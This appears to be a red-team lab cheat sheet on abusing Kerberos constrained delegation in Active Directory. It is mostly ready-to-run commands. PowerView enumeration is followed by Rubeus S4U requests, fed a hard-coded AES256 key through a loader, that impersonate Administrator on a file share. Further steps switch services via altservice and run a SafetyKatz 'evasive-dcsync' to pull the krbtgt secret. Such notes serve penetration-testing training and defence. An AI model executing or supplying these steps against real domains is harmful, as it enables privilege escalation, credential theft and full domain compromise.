To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in `msDS-AllowedToDelegateTo` of the `websvc` (web service on web server) account as **ANY user**

Find users and computers with constrained delegation enabled (PowerView + AD Module)
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne
"$null"} -Properties msDS-AllowedToDelegateTo
```

**COMPROMISE THE WEB SERVICE ACCOUNT AND RUN THE FOLLOWING AS IT**

Request a `TGT` and `TGS` and impersonate any user
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:STUDVM$ /aes256:777c150c5c1e2e3cef3861807fea59092e9a2d52308f2346cdc0b1d781292169 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /ptt
```

Test
```powershell
dir \\mgmtsrv.tech.finance.corp\c$
```

 
> [!NOTE] **NOTE**
> You can edit what services the machine/user account can access if you have `GenericAll/Write` rights to the first hop

#### Protocol Transition
We can change the protocol/service being accessed for the SPN. This is due to the SPN in the TGS being in clear-text and user editable.

**FOR MACHINE ACCOUNT AES KEYS ALWAYS USE THE ONE WHERE THE SID IS `S-1-5-18` AKA THE LAST ONE IN A LSADUMP**

Rubeus and the `/altservice` parameter
> **Note:** Change to `altservice` to `ldap` to run dcsync
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args s4u /user:STUDVM$ /aes256:777c150c5c1e2e3cef3861807fea59092e9a2d52308f2346cdc0b1d781292169 /impersonateuser:Administrator /msdsspn:"CIFS/mgmtsrv.tech.finance.corp" /altservice:http /ptt
```

Now run a DCSync 
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```